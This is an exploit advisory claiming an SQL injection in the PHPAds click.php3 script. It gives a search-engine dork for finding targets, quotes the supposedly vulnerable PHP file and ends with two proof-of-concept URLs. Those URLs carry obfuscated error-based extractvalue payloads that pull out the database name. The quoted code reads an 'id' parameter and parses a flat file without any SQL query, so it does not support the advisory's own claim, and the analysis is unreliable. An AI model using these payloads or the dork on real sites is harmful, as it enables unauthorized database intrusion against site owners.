
[+] Risk: High

[+] CWE Number : CWE-89

[+] Author: Felipe Andrian Peixoto

[+] Vendor Homepage: https://blondish.net/

[+] Software Demo : https://github.com/blondishnet/PHPads/blob/master/readme.txt

[+] Contact: felipe_andrian@hotmail.com

[+] Tested on: Windows 7 and Gnu/Linux

[+] Dork: inurl:"click.php3?bannerID="" // use your brain ;)

[+] Exploit : 

        http://host/patch//click.php3?bannerID= [SQL Injection]

[+] Vulnerable File :

	    <?php
		$bannerAdsPath = &#039;./ads.dat&#039;;
		require &#039;./ads.inc.php&#039;;
		///////////////////////////////////////
		// Don&#039;t Edit Anything Below This Line!
		///////////////////////////////////////
		for ($i = 0; $i < count($ads); $i++) {
			if(ereg(&#039;^&#039; .$_GET[&#039;id&#039;]. &#039;\|\|&#039;, $ads[$i])) {
				$data = explode(&#039;||&#039;, $ads[$i]);
			if ($_SERVER[&#039;REMOTE_ADDR&#039;] != $bannerAds[&#039;blockip&#039;]) {
					$data[ PHPADS_ADELEMENT_CLICKTHRUS ]++;
			}
				$ads[$i] = join(&#039;||&#039;, $data);
				break;
			}
		}
		if (!$data[PHPADS_ADELEMENT_LINK_URI]) {
			die();
		}
		writeads();
		Header("Location: ". $data[PHPADS_ADELEMENT_LINK_URI]);
		exit;
		?>

[+] PoC : 
 
   http://server/phpads/click.php3?bannerID=-1/*!50000and*/+/*!50000extractvalue*/(0x0a,/*!50000concat*/(0x0a,0x73337830753a,(/*!50000select*/%20database()),0x3a7333783075))--+-
   http:/server/phpAds/click.php3?bannerID=-1/*!50000and*/+/*!50000extractvalue*/(0x0a,/*!50000concat*/(0x0a,0x73337830753a,(/*!50000select*/%20database()),0x3a7333783075))--+-
   
[+] EOF

